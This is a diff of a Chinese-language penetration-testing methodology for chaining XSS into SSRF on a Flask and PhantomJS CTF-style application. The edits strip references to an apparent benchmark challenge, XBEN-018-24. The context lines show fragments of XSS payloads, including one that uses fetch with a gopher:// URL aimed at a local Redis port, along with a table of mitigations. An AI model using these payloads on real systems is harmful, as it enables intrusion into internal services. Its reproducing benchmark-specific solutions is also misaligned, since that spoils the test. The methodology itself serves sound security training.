@@ -4,7 +4,7 @@
 
 ### 1.1 编写目的
 
-本文档基于 XBEN-018-24 渗透测试实战分析，为渗透测试人员提供一套系统化的 Flask+PhantomJS 架构 XSS 与 SSRF 组合攻击方法论。重点针对使用 PhantomJS 进行 XSS 验证的 CTF 挑战应用，通过 XSS 漏洞实现服务器端请求伪造（SSRF）。
+本文档为渗透测试人员提供一套系统化的 Flask+PhantomJS 架构 XSS 与 SSRF 组合攻击方法论。重点针对使用 PhantomJS 进行 XSS 验证的 CTF 挑战应用，通过 XSS 漏洞实现服务器端请求伪造（SSRF）。
 
 ### 1.2 适用范围
 
@@ -35,7 +35,7 @@
 网络请求发起（SSRF） → 结果返回
 ```
 
-**XBEN-018-24 典型代码模式：**
+**典型代码模式：**
 
 ```python
 # Flask 应用代码（app.py）
@@ -313,7 +313,7 @@ PAYLOAD='<zzz onfocus="fetch(window.location).then(r=>r.text()).then(t=>{var m=t
 
 #### 2.3.3 完整攻击链
 
-**XBEN-018-24 实战攻击链：**
+**实战攻击链：**
 
 ```bash
 # 步骤 1：确认应用特征
@@ -442,9 +442,3 @@ PAYLOAD='<zzz onfocus="fetch(\"gopher://localhost:6379/_GET%20info%20HTTP/1.1%0D
 | 自动事件触发 | 移除 check.js 中的事件触发逻辑 |
 | 临时文件 Web 可访问 | 将临时文件存储在 Web 根目录外 |
 | 无 CSP 保护 | 添加 `Content-Security-Policy: default-src 'self'; script-src 'none'` |
-
----
-
-**文档版本：** 1.0
-**最后更新：** 2026 年 3 月
-**参考来源：** XBEN-018-24 渗透测试实战分析
